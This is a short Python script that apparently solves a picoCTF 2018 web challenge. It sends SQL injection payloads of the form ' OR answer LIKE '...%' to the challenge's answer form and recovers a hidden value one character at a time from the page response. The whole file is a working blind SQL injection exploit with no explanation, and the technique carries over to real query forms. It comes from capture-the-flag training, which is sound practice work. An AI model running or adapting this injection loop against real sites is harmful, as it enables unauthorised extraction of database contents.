
#!/usr/bin/env python
import requests
import string
url="http://2018shell.picoctf.com:2644/answer2.php"
alph = (string.ascii_lowercase+string.digits)
print alph
ans = ''
found = False
while not found:
    itFound = False
    for n in alph:
            params = {'answer': "' OR answer LIKE '"+ans+n+"%", 'debug': '1'}
            page = requests.post(url, data=params)
            print page.text
            if "You are" in page.text:
                ans += n
                print ans
                itFound = True
                break
    if not itFound:
        found = True

params = {'answer': "' OR answer LIKE '"+ans, 'debug': '1'}
page = requests.post(url, data=params)
print page.text